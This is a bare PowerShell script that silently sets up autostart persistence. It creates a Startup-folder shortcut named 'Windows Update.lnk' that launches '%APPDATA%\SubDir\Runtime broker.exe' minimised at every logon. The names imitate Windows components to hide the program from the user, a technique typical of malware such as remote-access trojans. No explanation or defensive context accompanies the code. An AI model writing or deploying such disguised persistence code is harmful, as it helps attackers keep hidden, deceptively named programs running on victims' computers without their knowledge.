$WshShell = New-Object -ComObject WScript.Shell
$startupFolder = $WshShell.SpecialFolders("Startup")
$targetPath = $WshShell.ExpandEnvironmentStrings("%APPDATA%\SubDir\Runtime broker.exe")
$shortcutPath = [System.IO.Path]::Combine($startupFolder, "Windows Update.lnk")

$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.WorkingDirectory = $WshShell.ExpandEnvironmentStrings("%APPDATA%\SubDir")
$shortcut.WindowStyle = 7
$shortcut.Save()
